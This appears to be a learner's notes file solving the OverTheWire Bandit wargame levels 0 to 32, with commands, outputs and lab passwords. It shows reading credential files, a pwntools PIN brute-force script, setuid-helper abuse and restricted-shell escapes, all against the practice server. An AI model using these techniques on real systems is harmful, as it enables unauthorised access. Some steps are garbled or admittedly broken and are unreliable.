# Bandit
# Notes to self:
# home directory cannot create fie
# tmp can create file for development
# logout

# (to logout)

# Level 0
#ssh bandit.labs.overthewire.org -p 2220
ls
readme
cat readme
boJ9jbbUNNfktd78OOpsqOltutMc3MY1

Level1:
#ssh bandit.labs.overthewire.org -l bandit1 -p 2220
cat ./-
CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9

# Level2:
#ssh bandit.labs.overthewire.org -l bandit2 -p 2220
ls
# issue is that there are spaces in the filename:
#spaces in this filename

cat spaces\ in\ this\ filename

# Level 3:
ssh bandit.labs.overthewire.org -l bandit3 -p 2220
ls -a
# output: .  ..  .hidden
cat .hidden


# Level 4:
ssh bandit.labs.overthewire.org -l bandit4 -p 2220

# to output the name of all the files starting with -file:
for file in ./-file*; do echo "$file";  cat "$file"; done
#Only readable is file07


# Level 5:
ssh bandit.labs.overthewire.org -l bandit5 -p 2220
# run cat on all the files matching certain specificities
find /home/ -type f -size 1033c -exec cat {} \;
# output: find: ‘/home/bandit28-git’: Permission denied
#find: ‘/home/bandit30-git’: Permission denied
#find: ‘/home/bandit31-git’: Permission denied


# Level 6:
ssh bandit.labs.overthewire.org -l bandit6 -p 2220
password: DXjZPULLxYr17uwoI01bNLQbtFemEgo7

find / -group bandit6 -user bandit7
cat /var/lib/dpkg/info/bandit7.password


# Level 7:
ssh bandit.labs.overthewire.org -l bandit7 -p 2220
password: HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs

# password is next to word millionth
grep 'millionth' data.txt
#millionth	cvX2JJa4CFALtqS87jk27qwqGhBM9plV

# Level 8:
#ssh bandit.labs.overthewire.org -l bandit8 -p 2220

#the password is the one that occurs only once
#sort data: file is sorted in alphabetical order
#uniq -c is to get the count of each adjacent occurrence (adjacent hence the sort before)
#grep is to only select the rows with “1”
#pipe is to make several transformations |
sort data.txt | uniq -c | grep "1 "
# 1 UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR



# Level 9:
#ssh bandit.labs.overthewire.org -l bandit9 -p 2220
# password is next to ===
strings data.txt | grep "==="



# Level 10:
#ssh bandit.labs.overthewire.org -l bandit10 -p 2220

# d is for decode
base64 -d data.txt

# Level 11:
#ssh bandit.labs.overthewire.org -l bandit11 -p 2220

#ROT13 encryption means do 13 rotations : A becomes 0   0 becomes A again:
cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# or:
alias rot13="tr '[A-Za-z]' '[N-ZA-Mn-za-m]'"
cat data.txt | rot13


# Level 12:
#ssh bandit.labs.overthewire.org -l bandit12 -p 2220

mkdir /tmp/test001
	cp data.txt /tmp/test001
	cd /tmp/test001
	xxd -r data.txt > data
	file data
	mv data data.gz
	gzip -d data.gz
	ls -al
	file data
	bzip2 -d data
	file data.out
	gzip -d data.gz
	file data
	tar xvf data.gz
	file data5.bin
	tar xvf data5.bin
	file data6.bin
	bzip2 -d data6.bin
	bzip2 -d data6.bin
	file data6.bin.out
	tar xvf data6.bin.out
	file data8.bin
	mv data8.bin data8.gz
	gzip -d data8.gz
	file data8
	cat data8

# Level 13:
ssh bandit.labs.overthewire.org -l bandit13 -p 2220

ssh -i sshkey.private bandit14@localhost

bandit14@bandit:~$ cat /etc/bandit_pass/
cat: /etc/bandit_pass/: Is a directory
bandit14@bandit:~$ cd /etc/bandit_pass/
bandit14@bandit:/etc/bandit_pass$ ls
bandit0  bandit10  bandit12  bandit14  bandit16  bandit18  bandit2   bandit21  bandit23  bandit25  bandit27  bandit29  bandit30  bandit32  bandit4  bandit6  bandit8
bandit1  bandit11  bandit13  bandit15  bandit17  bandit19  bandit20  bandit22  bandit24  bandit26  bandit28  bandit3   bandit31  bandit33  bandit5  bandit7  bandit9
bandit14@bandit:/etc/bandit_pass$ cat bandit0
cat: bandit0: Permission denied
bandit14@bandit:/etc/bandit_pass$ cat bandit14
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e



# Level 14:
cat /etc/bandit_pass/bandit14|nc localhost 30000



level 15:
cat /etc/bandit_pass/bandit15
BfMYroe26WYalil77FoDi9qh59eK5xNr

openssl s_client -ign_eof -connect localhost:30001


# Level 16:
nmap localhost -p 31000-32000
neat - - ssl localhost 31790

# Level 17:
diff passwords.new passwords.old
# to get the difference between two files

# Level 18:
#‘The password for the next level is stored in a file readme in the homedirectory. Unfortunately, someone has modified .bashrc to log you out when you log in with SSH.
# Trick is to perform an action right when log in it will do it before we get logged out.
ssh bandit18@bandit.labs.overthewire.org -p 2220 'ls -al'
ssh bandit18@bandit.labs.overthewire.org -p 2220 'cat readme'


# Level 19:
file bandit20-do
./bandit20-do cat /etc/bandit_pass/*

# Level 20:
ssh bandit20@bandit.labs.overthewire.org -p 2220

#First need to open a port and send password through it:
echo GbKksEFF4yrVs6il55v6gwY5aVje5f0j | nc -vlp 12345
#listening on [any] 12345 ...

#nc is listening on 12345 and if a connection is established, the password of the current level will be piped through the connection.
#Next open second terminal window and connect to bandit20 and run the binary:

./suconnect 12345


echo GbKksEFF4yrVs6il55v6gwY5aVje5f0j | nc -vlp 12345
#listening on [any] 12345 ...
#connect to [127.0.0.1] from localhost [127.0.0.1] 44028
#<password hidden for learning purposes here>


# Level 21:
ssh bandit21@bandit.labs.overthewire.org -p 2220
ls /etc/cron.d/
#cronjob_bandit22  cronjob_bandit23  cronjob_bandit24

#3 files only one is interesting for current level: cronjob_bandit22
cat /etc/cron.d/cronjob_bandit22
#@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
#* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null

#script (/usr/bin/cronjob_bandit22.sh) will be executed once on reboot and every minute.
#Take a look at the content of the script:

cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
#end of cat output

#The script writes the password from the next level (/etc/bandit_pass/bandit22) to a temporary folder (/tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv). We can read it and get the password for the next level:

cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv

# Level 22:
# ssh bandit22@bandit.labs.overthewire.org -p 2220

ls /etc/cron.d/
#cronjob_bandit22  cronjob_bandit23  cronjob_bandit24
cat /etc/cron.d/cronjob_bandit23
#@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
#* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
# end of cat output
bash /usr/bin/cronjob_bandit23.sh
#Copying passwordfile /etc/bandit_pass/bandit22 to /tmp/8169b67bd894ddbb4412f91573b38db3
vim /usr/bin/cronjob_bandit23.sh

#SO VIM DOES NOT WORK -> NO PERMISSIONS

#From the script, we know that the password for next level stored in the file named with $mytarget. And we need to set $myname to bandit23 to fetch the correct filename.
myname=bandit23
echo I am user $myname | md5sum | cut -d ' ' -f 1
cat /tmp/8ca319486bfbbc3663ea0fbe81326349

# Level23:
#ssh bandit23@bandit.labs.overthewire.org -p 2220
mkdir -p /tmp/hxjump
cd /tmp/hxjump
vim bandit24.sh
cat bandit24.sh
#!/bin/bash/

cat /etc/bandit_pass/bandit24 >> /tmp/hxjump/level24
bandit23@bandit:/tmp/hxjump$ chmod 777 bandit24.sh
bandit23@bandit:/tmp/hxjump$ cp bandit24.sh /var/spool/bandit24

#https://dynamicparallax.wordpress.com/2015/09/22/bandit-level-23-%E2%86%92-level-24/
#level appears broken, even when followed several answers, proceeded to the next question

# Level 24:
#ssh bandit24@bandit.labs.overthewire.org -p 2220

for i in {0000..999}; do echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"; done > /tmp/text.txt
while read line; do echo "$line"|nc localhost 30002 ; done < /tmp/text.txt
# does not seem to work, does not run

cat /tmp/text.txt | nc localhost 30002
# times out unfortunately

# found a way online:
mkdir /tmp/password24
cd /tmp/password24
nano brute.py

#Copy paste this:

#!/usr/bin/python
from pwn import *
from multiprocessing import Process

def brute(nrOne,nrTwo):
    for pin in range(nrOne,nrTwo):
        pin = str(pin).zfill(4)

        r = remote('127.0.0.1', 30002)
        r.recv()
        r.send('UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ' + pin + '\n')

        if 'Wrong' not in r.recvline():
            print '[+] Successful -> ' + pin
            print r.recvline()
            r.close()
        else:
            if int(pin) % 100 == 0:
                print '[!] Failed -> ' + pin
            r.close()

if __name__=='__main__':
    p1 = Process(target = brute, args = (0,2500,))
    p2 = Process(target = brute, args = (2500,5000,))
    p3 = Process(target = brute, args = (5000,7500,))
    p4 = Process(target = brute, args = (7500,10000,))
    p1.start()
    p2.start()
    p3.start()
    p4.start()


#cntrl+x then Enter

python brute.py SILENT=1

# https://medium.com/secttp/overthewire-bandit-level-24-aaaaf795b701
# uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

# Level 25:
ssh bandit25@bandit.labs.overthewire.org -p 2220
ssh bandit26@bandit.labs.overthewire.org -p 2220 -i bandit26.sshkey
will exit automatically, thats because shell for user bandit26 is not /bin/bash

cat /etc/passwd | grep bandit26
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext

cat /usr/bin/showtext
#!/bin/sh
export TERM=linux
more ~/text.txt
exit 0

#trick is to put terminal in very small window: so that can use the more command
# then enter this
ssh -i bandit26.sshkey bandit26@localhost
# then press v when that More -- message is up -> vim has opened up! The : colon key is here to tell vim you want to run a vim command... and open a new file by entering 
:r /etc/bandit_pass/bandit26.

# Level 26:
## Connect with ssh : ssh bandit26@bandit.labs.overthewire.org -p 2220
	## Reduce terminal size to use 'more' trick
	## type v then enter command
whoami
bandit26
ls
bandit27-do  text.txt
./bandit27-do
# Run a command as another user.
#   Example: ./bandit27-do id
./bandit27-do cat /etc/bandit_pass/bandit27


# Level 27:
ssh bandit27@bandit.labs.overthewire.org -p 2220

cd /tmp
mkdir banditpass27b
cd banditpass27b
git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
#input same pw as before
ls
cd repo
cat README


# Level 28:
ssh bandit28@bandit.labs.overthewire.org -p 2220

mkdir /tmp/bandit28pass
cd /tmp/bandit28pass
git clone ssh://bandit28-git@localhost/home/bandit28-git/repo
ls
cd repo
ls
cat README.md

#we see that the password is xxx
#lets see the log, to see if the user forgot and put his actual password and then changed it:


git log
# commit 073c27c130e6ee407e12faad1dd3848a110c4f95
# Author: Morla Porla <morla@overthewire.org>
# Date:   Tue Oct 16 14:00:39 2018 +0200
#
#     fix info leak
#
# commit 186a1038cc54d1358d42d468cdc8e3cc28a93fcb
# Author: Morla Porla <morla@overthewire.org>
# Date:   Tue Oct 16 14:00:39 2018 +0200
#
#     add missing data
#
# commit b67405defc6ef44210c53345fc953e6a21338cc7
# Author: Ben Dover <noone@overthewire.org>
# Date:   Tue Oct 16 14:00:39 2018 +0200
#
#     initial commit of README.md
git show 073c27c130e6ee407e12faad1dd3848a110c4f95
# commit 073c27c130e6ee407e12faad1dd3848a110c4f95
# Author: Morla Porla <morla@overthewire.org>
# Date:   Tue Oct 16 14:00:39 2018 +0200
#
#     fix info leak
#
# diff --git a/README.md b/README.md
# index 3f7cee8..5c6457b 100644
# --- a/README.md
# +++ b/README.md
# @@ -4,5 +4,5 @@ Some notes for level29 of bandit.
#  ## credentials
#
#  - username: bandit29
# -- password: bbc96594b4e001778eee9975372716b2
# +- password: xxxxxxxxxx


# We see the old password:
# protect your passwords kids don’t keep them in your github history like that!


# Level 29:
ssh bandit29@bandit.labs.overthewire.org -p 2220

mkdir /tmp/banditpassb
cd /tmp/banditpassb
git clone ssh://bandit29-git@localhost/home/bandit29-git/repo
#input same pw as before
ls

cat README.md
# does not show password
#lets look at the log
git log

# gives us 2 ids so lets see if one made a mistake
git show 84abedc104bbc0c65cb9eb74eb1d3057753e70f8
git show 9b19e7d8c1aadf4edcc5b15ba8107329ad6c5650

#nope no mistake
# but were in one branch, lets check out another branch!

git branch -a
git checkout remotes/origin/dev
ls
cat README.md

# level 30:
# ssh bandit30@bandit.labs.overthewire.org -p 2220

mkdir /tmp/password30w
cd /tmp/password30w

git clone ssh://bandit30-git@localhost/home/bandit30-git/repo

#How about git tagging ? Git has the ability to tag specific points in a repository’s history as being important.
git tag
# secret
git show secret

# Level 31:
# ssh bandit31@bandit.labs.overthewire.org -p 2220

mkdir /tmp/pass31
cd /tmp/pass31
git clone ssh://bandit31-git@localhost/home/bandit31-git/repo
cd repo

cat README.md
# This time your task is to push a file to the remote repository.
#
# Details:
#     File name: key.txt
#     Content: 'May I come in?'
#     Branch: master

vim key.txt
# then do esc   i  for insert, insert content.
git add key.txt
# The following paths are ignored by one of your .gitignore files:
# key.txt
# Use -f if you really want to add them.

# Let’s remove the files from gitignore:

ls -a
cat .gitignore
# *.txt

vim .gitignore
# esc + i -> delete info + esc + :wq

git add key.txt
git commit -m ‘this is the due file’
git push

# Level 32:
#ssh bandit32@bandit.labs.overthewire.org -p 2220
#The shell converts every command into uppercase. We need to fix it and gain the normal shell again. Since this is an interactive shell, we have the chance to execute it again using the variable
$0
ls -al
cat /etc/bandit_pass/bandit33
